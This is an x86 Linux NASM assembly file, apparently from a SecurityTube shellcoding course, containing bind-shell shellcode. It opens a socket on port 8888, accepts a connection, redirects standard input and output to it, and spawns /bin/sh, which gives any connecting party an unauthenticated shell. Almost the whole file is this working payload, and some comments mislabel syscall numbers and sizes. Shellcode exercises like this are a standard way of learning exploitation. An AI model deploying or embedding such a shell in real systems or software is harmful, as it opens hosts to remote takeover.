; Filename: .nasm
; Author:  Ricardo Ruiz
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text

_start:

	; Write message
	xor eax, eax
	mov al, 0x4 		; Syscall 4 = Write
	xor ebx, ebx
	mov bl, 1 		; $ebx = 0x1
	push 0x0a2e2e2e		; 'Binding port...' message
	push 0x74726f70
	push 0x20676e69
	push 0x646e6942
	mov ecx,esp  		; $ecx = Address of stack, containing the message
	xor edx, edx		; $edx = 0
	mov dl, 0x10 		; Message length (4*4=16)
	int 0x80

	; Socket - 359
	xor eax, eax
	mov ax, 0x167		; Syscall 359 = Socket
	xor ebx, ebx
	mov bl, 2 		; $ebx = Domain = 2 [AF_INET]
	xor ecx, ecx
	mov cl, 1 		; $ecx = Type = 1 [SOCK_STREAM]
	xor edx, edx 		; $edx = Protocol = 0 [not set]
	int 0x80 
	push eax 		; File descriptor gets pushed to stack

	; Bind - 361
	xor eax, eax
	mov ax, 0x169 		; Syscall 361 = Bind
	pop ebx 		; $ebx = File descriptor stored in stack / returned by socket syscall
	xor ecx, ecx
	push dword ecx 		
    push ecx			; sin_ip, big endian format (the IP address)
    push word 0xb822 	; sin_port 8888, big endian format (the Port)
    push word 2 		; sin_family = 2
	mov ecx, esp		; $ecx = Address of stack, containing sin_family, sin_port and sin_ip
	xor edx, edx		
	mov dl, 0x10 		; $edx = Address length is 16 bits
	push ebx			; File descriptor gets pushed to stack again
	int 0x80

	; Listen - 363
	xor eax, eax
	mov ax, 0x16b 		; Syscall 363 = Listen
	pop ebx			; $ebx = File descriptor address
	push ebx		; It gets pushed again
	xor ecx, ecx 		; $ecx = backlog = 0
	int 0x80

	; Accept - 364
	xor eax, eax
	mov ax, 0x16c 		; Syscall 364 = Accept
	pop ebx 		; $ebx = File descriptor address
	xor ecx, ecx 		; $ecx = addr = 0, local address
	xor edx, edx
	mov dl, 0x10 		; $edx = Address length is 16 bits 
	int 0x80
	push eax		; New file descriptor gets pushed to stack


	;dup2 - fd 0
	xor eax, eax
	mov al, 0x3f  		; Syscall is 63 = Dup2
	pop ebx 
	push ebx 		; $ebx = File descriptor address
	xor ecx, ecx 		; $ecx = New file descriptor = 0
	int 0x80

	;dup2 - fd 1
	xor eax, eax
	mov al, 0x3f  		; Syscall is 63 = Dup2
	pop ebx
	push ebx 		; $ebx = File descriptor address
	xor ecx, ecx
	mov cl, 1 		; $ecx = New file descriptor = 1
	int 0x80

	;dup2 - fd 2
	xor eax, eax
	mov al, 0x3f 		; Syscall is 63 = Dup2
	push ebx 			; $ebx = File descriptor address
	xor ecx, ecx
	mov cl, 2 	 		; $ecx = New file descriptor = 2
	int 0x80
	

	; Execve
	xor eax, eax
	push eax 		; Push 0x0
	push 0x68732f2f		; Push '//sh' string
	push 0x6e69622f		; Push '/bin' string
	mov ebx, esp 		; $ebx =  '/bin//sh' and 0x0
	push eax 		; Push  0x0
	mov edx, esp 		; $edx = 0x0
	push ebx 		; Push $ebx =  '/bin//sh' and 0x0
	mov ecx, esp 		; Address of stack, containing 0x0, '/bin//sh' and 0x0
	mov al, 11  		; Syscall is 17 = Execve
	int 0x80